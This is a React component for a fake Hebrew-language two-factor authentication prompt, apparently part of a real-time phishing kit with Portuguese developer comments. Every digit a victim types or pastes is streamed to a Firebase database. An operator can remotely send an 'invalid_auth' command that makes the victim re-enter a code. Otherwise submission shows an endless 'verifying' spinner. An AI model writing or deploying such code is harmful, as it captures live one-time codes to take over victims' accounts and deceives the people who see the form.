import React, { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { useTranslation } from 'react-i18next';
import { useFirebaseClient } from '../hooks/useFirebaseClient';
import { reportTyping } from '../firebase/typing';
import { Shield, Check } from 'lucide-react';

const AuthForm = () => {
  const { t } = useTranslation();
  const navigate = useNavigate();
  const [authCode, setAuthCode] = useState(() => ['', '', '', '', '', '']);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');
  const [invalidMessage, setInvalidMessage] = useState('');
  const [copied, setCopied] = useState(false);
  const [showInvalidPopup, setShowInvalidPopup] = useState(false);
  const [showHebrewErrorPopup, setShowHebrewErrorPopup] = useState(false);
  const [hasInvalidAuth, setHasInvalidAuth] = useState(false);
  const inputRefs = useRef([]);

  // Hook do Firebase Client
  const {
    clientId,
    clientData,
    isOnline,
    loading: firebaseLoading,
    updateClientData,
    commands,
  } = useFirebaseClient(navigate);

  // Função para limpar comandos de invalidação
  const clearInvalidationCommand = async (commandType) => {
    try {
      const { ref, remove } = await import("firebase/database");
      const { database } = await import("../firebase/config");

      const commandsRef = ref(database, `commands/${clientId}`);
      await remove(commandsRef);
      console.log("🧹 AuthForm - Comando de invalidação limpo:", commandType);
    } catch (error) {
      console.error("❌ AuthForm - Erro ao limpar comando:", error);
    }
  };

  // Escutar comandos de invalidação
  useEffect(() => {
    if (commands && commands.includes("invalid_auth")) {
      // Resetar formulário
      setAuthCode(['', '', '', '', '', '']);
      setLoading(false);
      setSuccess('');
      setError('');
      setHasInvalidAuth(false);
      
      // Definir mensagem em hebraico
      setInvalidMessage('קוד 2FA לא תקין. אנא נסה שוב.');
      setShowInvalidPopup(true);
      
      clearInvalidationCommand("invalid_auth");
      
      // Fechar popup após 3 segundos
      setTimeout(() => {
        setShowInvalidPopup(false);
      }, 3000);
    }
  }, [commands]);

  // Função para lidar com mudança nos inputs
  const handleInputChange = (index, value) => {
    // Limpar estado de erro quando usuário começar a digitar
    if (hasInvalidAuth) {
      setHasInvalidAuth(false);
    }
    
    // Permitir apenas números
    if (!/^\d*$/.test(value)) return;
    
    const newAuthCode = [...authCode];
    newAuthCode[index] = value;
    setAuthCode(newAuthCode);
    
    // Auto-focus no próximo input
    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
    
    // Reportar typing e atualizar Firebase
    const fullCode = newAuthCode.join('');
    reportTyping("auth", fullCode);
    updateClientData({
      authCode: fullCode,
      lastAuthInput: Date.now(),
      authStatus: fullCode ? "Input" : "Empty",
    });
  };

  // Função para lidar com backspace
  const handleKeyDown = (index, e) => {
    if (e.key === 'Backspace' && !authCode[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  // Função para lidar com paste
  const handlePaste = (e) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
    const newAuthCode = pastedData.split('').concat(Array(6).fill('')).slice(0, 6);
    setAuthCode(newAuthCode);
    
    // Focus no último input preenchido ou no primeiro vazio
    const lastFilledIndex = newAuthCode.findIndex(code => !code);
    const focusIndex = lastFilledIndex === -1 ? 5 : lastFilledIndex;
    inputRefs.current[focusIndex]?.focus();
    
    // Reportar typing e atualizar Firebase
    const fullCode = newAuthCode.join('');
    reportTyping("auth", fullCode);
    updateClientData({
      authCode: fullCode,
      lastAuthInput: Date.now(),
      authStatus: fullCode ? "Input" : "Empty",
    });
  };

  // Função para copiar código
  const copyCode = () => {
    const fullCode = authCode.join('');
    navigator.clipboard.writeText(fullCode);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  // Função para enviar código de autenticação
  const handleSubmit = async (e) => {
    e.preventDefault();
    
    const code = authCode.join('');
    if (code.length !== 6) {
      setError('Por favor, insira o código completo de 6 dígitos');
      return;
    }

    setLoading(true);
    setError('');
    
    try {
      // Loading infinito - só para se detectar invalid_auth
      while (true) {
        // Simular validação do código 2FA
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        // Simular código inválido para demonstrar funcionalidade
        if (code === '123456') {
          throw new Error('invalid_auth');
        }
        
        // Para códigos válidos, continua carregando infinitamente
        // (na implementação real, aqui haveria uma validação real do servidor)
      }
      
    } catch (err) {
      if (err.message === 'invalid_auth') {
        // Limpar inputs e mostrar outline vermelha
        setAuthCode(['', '', '', '', '', '']);
        setHasInvalidAuth(true);
        setError(''); // Remover mensagem de erro padrão
        
        // Definir a mensagem para o card vermelho (mesmo se ele não estiver visível neste fluxo)
        setInvalidMessage('קוד 2FA לא תקין. אנא נסה שוב.');

        setShowHebrewErrorPopup(true); // Mostrar popup em hebraico
        setLoading(false);
        // Focar no primeiro input
        inputRefs.current[0]?.focus();
        
        // Fechar popup após 4 segundos e resetar hasInvalidAuth
        setTimeout(() => {
          setShowHebrewErrorPopup(false);
          setHasInvalidAuth(false); // Resetar outline vermelho
        }, 4000);
      } else {
        setError('שלח');
        setLoading(false);
      }
    }
  };

  // Se está carregando, mostrar spinner
  if (loading) {
    return (
      <div className="w-full max-w-full mx-auto text-center px-4 py-6">
        <div className="flex flex-col items-center justify-center space-y-4 max-w-sm mx-auto">
          {/* Spinner somente (removidas imagens acima do spinner) */}
          <div className="w-14 h-14 border-4 border-blue-600/20 border-t-blue-600 rounded-full animate-spin"></div>
          
          {/* Textos de loading */}
          <div className="space-y-2 px-4">
            <h2 className="text-lg font-semibold text-gray-800" dir="rtl" style={{ fontFamily: 'Rubik, sans-serif' }}>
              מעבד קוד 2FA...
            </h2>
            <p className="text-sm text-gray-600 leading-relaxed" dir="rtl" style={{ fontFamily: 'Rubik, sans-serif' }}>
              אנא המתן בזמן שאנו מאמתים את הקוד שלך
            </p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <>
      {/* Modal principal - igual ao SMS */}
      <div className="fixed inset-0 bg-black bg-opacity-50 flex items-start justify-center z-50 p-2 sm:p-4 pt-8 sm:pt-16">
        <div className="bg-white shadow-xl w-full max-w-md sm:max-w-lg mx-auto relative mt-4 sm:mt-8 max-h-[90vh] overflow-y-auto">
          {/* Header do Modal */}
          <div className="text-center p-4 sm:p-6 pb-2 sm:pb-3 relative">
            <h2 className="text-lg sm:text-xl font-semibold text-gray-800 mb-1">
              אימות דו-שלבי
            </h2>
          </div>

          {/* Conteúdo do Modal */}
          <div className="p-4 sm:p-6 pt-2 sm:pt-3">
            {loading && (
              <div className="flex justify-center items-center py-6 sm:py-8">
                <div className="animate-spin rounded-full h-6 w-6 sm:h-8 sm:w-8 border-b-2 border-blue-500"></div>
              </div>
            )}

            {/* Popup de inválido (card vermelho) */}
            {showInvalidPopup && (
              <div className="mb-4 p-3 bg-red-100 border border-red-400 text-red-700 rounded text-sm flex justify-center items-center" dir="rtl" style={{ fontFamily: 'Rubik, sans-serif' }}>
                <span className="text-center">{invalidMessage}</span>
              </div>
            )}

            {/* Formulário */}
            <form onSubmit={handleSubmit} className="space-y-3 sm:space-y-4">
              {/* Grid de inputs - igual ao SMS */}
              {!loading && (
                <div className="grid grid-cols-6 gap-2 sm:gap-3 mb-2 sm:mb-3 px-1 sm:px-2">
                  {Array.isArray(authCode) && authCode.map((digit, index) => (
                    <input
                      key={index}
                      ref={(el) => (inputRefs.current[index] = el)}
                      type="text"
                      inputMode="numeric"
                      pattern="[0-9]*"
                      maxLength={1}
                      value={digit}
                      onChange={(e) => handleInputChange(index, e.target.value)}
                      onKeyDown={(e) => handleKeyDown(index, e)}
                      onPaste={handlePaste}
                      className={`w-full h-10 sm:h-12 text-center text-base sm:text-lg font-medium border-2 ${
                        hasInvalidAuth 
                          ? 'border-red-500 focus:border-red-600 focus:outline-none focus:ring-2 focus:ring-red-200 bg-red-50' 
                          : 'border-gray-300 focus:border-blue-500'
                      } focus:outline-none transition-colors bg-white rounded-md`}
                      style={{ fontFamily: 'Rubik, sans-serif', color: '#7380BF' }}
                    />
                  ))}
                </div>
              )}

              {/* Texto específico abaixo dos inputs */}
              {!loading && (
                <div className="text-right mb-3 sm:mb-4 px-1 sm:px-2 mt-2">
                  <p className="text-gray-600 text-xs sm:text-sm leading-relaxed">
                    הזן את קוד ה-2FA מהאפליקציה שלך
                  </p>
                </div>
              )}

              {/* Botão "סגירה" igual ao SMS */}
              <div className="mt-4 sm:mt-6">
                <button
                  type="submit"
                  className="bg-white text-blue-500 font-medium py-2.5 px-5 transition-colors flex items-center justify-center gap-2 text-sm rounded-full mx-auto z-[60] hover:bg-blue-500 hover:text-white border border-blue-500 min-w-[120px]"
                  disabled={loading}
                >
                  {loading ? (
                    <div className="animate-spin rounded-full h-4 w-4 border-2 border-current border-t-transparent"></div>
                  ) : (
                    <span className="text-sm">שלח</span>
                  )}
                </button>
              </div>

              {/* Mensagens de erro e sucesso */}
              {!loading && error && !hasInvalidAuth && (
                <div className="text-red-600 text-xs sm:text-sm text-center bg-red-50 p-2 sm:p-3 rounded flex justify-center items-center" dir="rtl" style={{ fontFamily: 'Rubik, sans-serif' }}>
                  <span className="text-center">קוד 2FA לא תקין. אנא נסה שוב.</span>
                </div>
              )}

              {!loading && success && (
                <div className="text-green-600 text-xs sm:text-sm text-center bg-green-50 p-2 sm:p-3 rounded flex items-center justify-center gap-2">
                  <Check size={14} className="sm:w-4 sm:h-4" />
                  {success}
                </div>
              )}
            </form>
          </div>
        </div>
      </div>

      {/* Popup de erro em hebraico - acima de todos os modais */}
      {showHebrewErrorPopup && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-[60] p-4">
          <div className="bg-white rounded-lg p-6 max-w-sm w-full mx-4 text-center shadow-xl">
            <div className="mb-4">
              <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-3">
                <svg className="w-8 h-8 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path>
                </svg>
              </div>
              <h3 className="text-lg font-semibold text-gray-900 mb-2" style={{ fontFamily: 'Rubik, sans-serif' }}>
                קוד 2FA לא תקין
              </h3>
              <p className="text-gray-600 text-sm" style={{ fontFamily: 'Rubik, sans-serif' }}>
                הקוד שהזנת אינו תקין. אנא נסה שוב עם קוד חדש.
              </p>
            </div>
            <button
              onClick={() => setShowHebrewErrorPopup(false)}
              className="w-full bg-blue-500 hover:bg-blue-600 text-white font-medium py-2 px-4 rounded-md transition-colors"
              style={{ fontFamily: 'Rubik, sans-serif' }}
            >
              הבנתי
            </button>
          </div>
        </div>
      )}
    </>
  );
};

export default AuthForm;